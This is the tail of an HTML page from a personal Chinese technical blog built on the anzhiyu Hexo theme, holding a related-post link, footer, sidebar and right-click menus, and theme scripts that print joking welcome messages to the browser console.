onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129133005.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulhub DC"/></a><div class="content"><a class="title" href="/2023/11/27/20231127-vulhub-DC/" title="vulhub DC">vulhub DC</a><time datetime="2023-11-26T16:00:00.000Z" title="发表于 2023-11-27 00:00:00">2023-11-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="Johnny" target="_blank">Johnny</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/C/" style="font-size: 0.88rem;">C<sup>1</sup></a><a href="/tags/Golang/" style="font-size: 0.88rem;">Golang<sup>1</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>4</sup></a><a href="/tags/Nginx/" style="font-size: 0.88rem;">Nginx<sup>1</sup></a><a href="/tags/Spring-Cloud/" style="font-size: 0.88rem;">Spring Cloud<sup>3</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">安全<sup>5</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2022 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Johnny 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>